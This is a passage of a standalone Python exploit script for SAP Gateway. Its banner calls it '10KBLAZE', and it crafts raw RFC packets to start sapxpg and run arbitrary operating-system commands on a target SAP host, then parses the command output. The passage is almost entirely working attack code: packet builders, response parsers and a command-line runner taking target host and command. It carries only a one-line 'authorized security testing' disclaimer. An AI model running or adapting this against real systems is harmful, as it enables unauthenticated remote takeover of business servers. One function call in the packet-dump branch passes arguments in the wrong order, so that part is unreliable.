    c += build_tlv(b"\x01\x11\x01\x14", client.encode("ascii"))
    c += build_tlv(b"\x01\x14\x01\x15", b"E")
    c += build_tlv(b"\x01\x15\x00\x09", b"SAP*")
    c += build_tlv(b"\x00\x09\x01\x34", client.encode("ascii"))
    c += build_tlv(b"\x01\x34\x05\x01", b"\x01")

    c += b"\x05\x01\x01\x36"
    c += struct.pack("!H", len(cpic_param_data)) + cpic_param_data

    c += b"\x01\x36\x05\x02"
    c += struct.pack("!H", 0)

    c += build_tlv(b"\x05\x02\x00\x0b", kernel.encode("ascii"))
    c += build_tlv(b"\x00\x0b\x01\x02", b"SAPXPG_END_XPG")

    c += b"\x01\x02\x05\x03"
    c += struct.pack("!H", 0)

    c += b"\x05\x03\x01\x31"
    c += struct.pack("!H", len(th)) + th

    c += b"\x01\x31\x05\x14"
    c += struct.pack("!H", len(cpic_param2_data)) + cpic_param2_data

    c += build_tlv(b"\x05\x14\x04\x20", b"\x00\x00\x00\x00")
    c += b"\x04\x20\x05\x12"
    c += struct.pack("!H", 0)

    c += xpg_end

    c += b"\x03\x02\x01\x04"
    c += struct.pack("!H", len(suffix)) + suffix

    c += b"\x01\x04\xff\xff"
    c += struct.pack("!H", 0)

    c += b"\xff\xff\x00\x00"

    return c


def build_p4(conv_id, target_ip, hostname, sid, instance, kernel, dest="T_75", client="000"):
    """Build F_SAP_SEND packet with SAPXPG_END_XPG.

    Uses the full SAPCPIC format (with TH struct and metadata TLVs)
    which works on both older and newer (793+) SAP kernels.
    """
    cpic_end = build_sapcpic_end(target_ip, hostname, sid, instance, kernel, dest, client)

    header = build_saprfc_header_v6(
        func_type=0xCB,         # F_SAP_SEND = 203
        gw_id=1,
        uid=19,
        info2=0,
        info3=0,
        timeout=500,
        sap_param_len=8,
        info=0x0085,            # SYNC_CPIC_FUNCTION + WITH_GW_SAP_PARAMS_HDR + R3_CPIC_LOGIN_WITH_TERM
        vector=0x0C,            # F_V_SEND_DATA + F_V_RECEIVE
        conv_id=conv_id,
    )

    cm_ok = b"\x00" * 31 + b"\x02"

    p = header + cm_ok + cpic_end
    p += struct.pack("!H", len(cpic_end))   # cpic_packet_size
    p += struct.pack("!I", 28000)           # rfc_packet_size

    return p


def extract_p4_output(data):
    """Extract command output from a P4 (SAPXPG_END_XPG) response.

    Handles two formats:
    - Old kernels (<793): output lines are TLV-encoded as 03 04 03 04 00 <len> <data>
    - New kernels (793+): output is a single space-padded block in 03 02 03 03 TLV

    Returns a list of output lines (strings).
    """
    lines = []

    # Skip RFC header (48 bytes) + cm_ok (32 bytes) = 80 bytes
    search_start = 80

    i = search_start
    while i < len(data) - 6:
        # Check for TLV output line: XX XX 03 04 00 <len> <data>
        # First line uses 03 02 03 04, subsequent lines use 03 04 03 04
        if (data[i:i+4] == b"\x03\x04\x03\x04"
                or data[i:i+4] == b"\x03\x02\x03\x04"):
            line_len = struct.unpack("!H", data[i+4:i+6])[0]
            if line_len > 0 and i + 6 + line_len <= len(data):
                raw = data[i+6:i+6+line_len]
                # Strip trailing \r \x20 (CR + space used as line endings)
                text = raw.decode("ascii", errors="ignore").rstrip("\r\n \x00")
                if text:
                    lines.append(text)
                i += 6 + line_len
                continue
        # Check for padded block: 03 02 03 03 00 <len> <padded_data>
        # (new kernels: output is a single space-padded block)
        elif data[i:i+4] == b"\x03\x02\x03\x03":
            block_len = struct.unpack("!H", data[i+4:i+6])[0]
            if block_len > 0 and i + 6 + block_len <= len(data):
                raw = data[i+6:i+6+block_len]
                text = raw.decode("ascii", errors="ignore").rstrip(" \x00\r\n")
                if text:
                    for line in text.split("\n"):
                        line = line.rstrip("\r ")
                        if line:
                            lines.append(line)
                i += 6 + block_len
                continue
        i += 1

    return lines


# ---------------------------------------------------------------------------
# Response parsing
# ---------------------------------------------------------------------------

def extract_ascii_strings(data, min_len=3):
    """Extract printable ASCII strings from binary data."""
    strings = []
    current = ""
    for b in data:
        if 32 <= b <= 126:
            current += chr(b)
        else:
            if len(current) >= min_len:
                strings.append(current)
            current = ""
    if len(current) >= min_len:
        strings.append(current)
    return strings


def extract_utf16_strings(data, min_len=3):
    """Extract UTF-16LE encoded strings from binary data."""
    strings = []
    current = ""
    i = 0
    while i < len(data) - 1:
        lo = data[i]
        hi = data[i + 1]
        if hi == 0 and 32 <= lo <= 126:
            current += chr(lo)
        else:
            if len(current) >= min_len:
                strings.append(current)
            current = ""
        i += 2
    if len(current) >= min_len:
        strings.append(current)
    return strings


def parse_response(data, step_name=""):
    """Parse a gateway response, detect errors, extract useful info."""
    info = {
        "error": False,
        "error_msg": "",
        "conv_id": None,
        "strtstat": None,
        "strings_ascii": [],
        "strings_utf16": [],
    }

    # Check for gateway error
    if b"*ERR*" in data:
        info["error"] = True
        strings = extract_ascii_strings(data, 4)
        info["error_msg"] = " | ".join(strings)
        info["strings_ascii"] = strings
        return info

    # Check for RFC_NOT_FOUND (UTF-16LE)
    utf16 = extract_utf16_strings(data, 3)
    info["strings_utf16"] = utf16
    for s in utf16:
        if "RFC_NOT_FOUND" in s:
            info["error"] = True
            info["error_msg"] = "RFC_NOT_FOUND: " + " ".join(
                s2 for s2 in utf16 if len(s2) > 3
            )
            return info

    # Extract conversation ID (8-digit decimal string)
    ascii_strings = extract_ascii_strings(data, 8)
    info["strings_ascii"] = ascii_strings
    for s in ascii_strings:
        if s.isdigit() and len(s) == 8:
            info["conv_id"] = s
            break

    # Extract STRTSTAT value if present
    # Try ASCII first, then UTF-16LE (kernel 793+ returns UTF-16LE)
    strtstat_ascii = b"STRTSTAT"
    strtstat_utf16 = "STRTSTAT".encode("utf-16-le")  # S\x00T\x00R\x00...

    idx = data.find(strtstat_ascii)
    if idx >= 0:
        # ASCII: status is a single char some bytes after the label
        window = data[idx:idx + 50]
        for i in range(len(window)):
            ch = window[i]
            if ch in (ord('O'), ord('F'), ord('E')):
                info["strtstat"] = chr(ch)
                break
    else:
        # Try UTF-16LE encoded STRTSTAT
        idx = data.find(strtstat_utf16)
        if idx >= 0:
            # Status value is also UTF-16LE encoded (e.g. O\x00)
            # Skip past the STRTSTAT label + TLV overhead to find it
            window = data[idx + len(strtstat_utf16):idx + len(strtstat_utf16) + 30]
            for i in range(0, len(window) - 1, 2):
                lo, hi = window[i], window[i + 1]
                if hi == 0 and lo in (ord('O'), ord('F'), ord('E')):
                    info["strtstat"] = chr(lo)
                    break

    return info


def hexdump(data, length=16):
    """Simple hex dump for debugging."""
    lines = []
    for i in range(0, len(data), length):
        chunk = data[i:i + length]
        hex_part = " ".join("%02x" % b for b in chunk)
        ascii_part = "".join(chr(b) if 32 <= b <= 126 else "." for b in chunk)
        lines.append("%04x  %-*s  %s" % (i, length * 3 - 1, hex_part, ascii_part))
    return "\n".join(lines)


# ---------------------------------------------------------------------------
# Main execution flow
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="SAP Gateway SAPXPG command execution - standalone Python 3. Example usage: #python3 sap_gw_xpg_standalone.py --host 192.168.2.209 --port 3300 --command mkdir --params /tmp/test123 --hostname s4hanadev --sid S4H",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="For authorized security testing only.",
    )
    parser.add_argument("--host", required=True, help="Target SAP host IP")
    parser.add_argument("--port", type=int, default=None,
                        help="Target gateway port (default: 33<instance>)")
    parser.add_argument("--instance", default="00", help="SAP instance number (default: 00)")
    parser.add_argument("--sid", required=True, help="SAP System ID (e.g. S4H)")
    parser.add_argument("--hostname", required=True, help="SAP hostname (e.g. s4hanadev)")
    parser.add_argument("--command", required=True, help="Command to execute (e.g. mkdir)")
    parser.add_argument("--params", default="", help="Command parameters (e.g. /tmp/test)")
    parser.add_argument("--kernel", default="793", help="Target SAP kernel version (default: 793)")
    parser.add_argument("--client", default="000", help="SAP client number (default: 000)")
    parser.add_argument("--dest", default="T_75", help="RFC destination name (default: T_75)")
    parser.add_argument("--skip-end-xpg", action="store_true",
                        help="Skip SAPXPG_END_XPG step (required for kernel 793+)")
    parser.add_argument("--timeout", type=int, default=10,
                        help="Socket timeout in seconds (default: 10)")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Verbose output with hex dumps")
    parser.add_argument("--dump-packets", metavar="PREFIX",
                        help="Dump raw packets to PREFIX_p1.bin etc. (for verification)")

    args = parser.parse_args()

    if args.port is None:
        args.port = 3300 + int(args.instance)

    print("=" * 60)
    print("SAP Gateway SAPXPG Command Execution (10KBLAZE)")
    print("Target: %s:%d (SID: %s, Instance: %s, Kernel: %s)" % (
        args.host, args.port, args.sid, args.instance, args.kernel))
    print("Command: %s %s" % (args.command, args.params))
    print("=" * 60)

    # Build packets for optional dump (before connecting)
    p1_data = build_p1(args.host, args.instance)
    p2_data = build_p2(args.host, args.dest)

    if args.dump_packets:
        # Dump P1 and P2 immediately; P3/P4 need conv_id so use placeholder
        with open("%s_p1.bin" % args.dump_packets, "wb") as f:
            f.write(p1_data)
        with open("%s_p2.bin" % args.dump_packets, "wb") as f:
            f.write(p2_data)
        p3_data = build_p3("00000000", args.host, args.hostname, args.sid,
                           args.instance, args.kernel, args.dest, args.client,
                           args.command, args.params)
        with open("%s_p3.bin" % args.dump_packets, "wb") as f:
            f.write(p3_data)
        p4_data = build_p4("00000000", args.kernel, args.host)
        with open("%s_p4.bin" % args.dump_packets, "wb") as f:
            f.write(p4_data)
        print("[*] Packets dumped to %s_p[1-4].bin" % args.dump_packets)
        if not sys.stdout.isatty():
            return  # If piped, just dump and exit

    # Connect
    print("\n[*] Connecting to %s:%d ..." % (args.host, args.port))
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(args.timeout)
        sock.connect((args.host, args.port))
    except socket.error as e:
        print("[-] Connection failed: %s" % e)
        sys.exit(1)
    print("[+] Connected")

    # Step 1: GW_NORMAL_CLIENT
    print("\n[*] Step 1: GW_NORMAL_CLIENT")
    ni_send(sock, p1_data)
    resp = ni_recv(sock, args.timeout)
    if args.verbose:
        print(hexdump(resp[:200]))
    info = parse_response(resp, "GW_NORMAL_CLIENT")
    if info["error"]:
        print("[-] Rejected: %s" % info["error_msg"])
        sock.close()
        sys.exit(1)
    print("[+] Accepted by gateway")

    # Step 2: F_SAP_INIT
    print("\n[*] Step 2: F_SAP_INIT (STARTED_PRG -> sapxpg)")
    ni_send(sock, p2_data)
    resp = ni_recv(sock, args.timeout)
    if args.verbose:
        print(hexdump(resp[:200]))
    info = parse_response(resp, "F_SAP_INIT")
    if info["error"]:
        print("[-] F_SAP_INIT error: %s" % info["error_msg"])
        sock.close()
        sys.exit(1)

    conv_id = info["conv_id"]
    if not conv_id:
        print("[-] Could not extract conversation ID from response")
        if args.verbose:
            print(hexdump(resp))
        sock.close()
        sys.exit(1)
    print("[+] Conversation ID: %s" % conv_id)

    # Step 3: F_SAP_SEND (SAPXPG_START_XPG_LONG)
    print("\n[*] Step 3: SAPXPG_START_XPG_LONG (executing: %s %s)" % (
        args.command, args.params))
    p3_data = build_p3(conv_id, args.host, args.hostname, args.sid,
                       args.instance, args.kernel, args.dest, args.client,
                       args.command, args.params)
    ni_send(sock, p3_data)
    resp = ni_recv(sock, args.timeout)
    print("[+] Response: %d bytes" % len(resp))
    if args.verbose:
        print(hexdump(resp[:500]))

    info = parse_response(resp, "SAPXPG_START_XPG_LONG")
    if info["error"]:
        print("[-] Error: %s" % info["error_msg"])
        sock.close()
        sys.exit(1)

    if info["strtstat"]:
        status_map = {"O": "OK (command executed)", "F": "Failed", "E": "Error"}
        status_desc = status_map.get(info["strtstat"], "Unknown (%s)" % info["strtstat"])
        print("[+] STRTSTAT: %s - %s" % (info["strtstat"], status_desc))
    else:
        print("[*] Could not determine STRTSTAT from response")

    # Print response strings
    if args.verbose:
        print("\n[*] ASCII strings in response:")
        for s in info["strings_ascii"]:
            print("    %s" % s)
        if info["strings_utf16"]:
            print("\n[*] UTF-16LE strings in response:")
            for s in info["strings_utf16"]:
                print("    %s" % s)

    # Step 4: SAPXPG_END_XPG (optional)
    if not args.skip_end_xpg:
        print("\n[*] Step 4: SAPXPG_END_XPG (retrieving output)")
        p4_data = build_p4(conv_id, args.host, args.hostname, args.sid,
                           args.instance, args.kernel, args.dest, args.client)
        ni_send(sock, p4_data)
        try:
            resp = ni_recv(sock, args.timeout)
            print("[+] Response: %d bytes" % len(resp))
            if args.verbose:
                print(hexdump(resp[:500]))

            info = parse_response(resp, "SAPXPG_END_XPG")
            if info["error"]:
                print("[-] END_XPG error: %s" % info["error_msg"])
            else:
                output_lines = extract_p4_output(resp)
                if output_lines:
                    print("[+] Command output:")
                    for line in output_lines:
                        print("    %s" % line)
                else:
                    print("[*] No output captured (command may have no stdout)")
        except (socket.timeout, ConnectionError) as e:
            print("[-] END_XPG timeout/error: %s" % e)
    else:
        print("\n[*] Skipping SAPXPG_END_XPG (--skip-end-xpg)")

    sock.close()
    print("\n[+] Done")


if __name__ == "__main__":
    main()
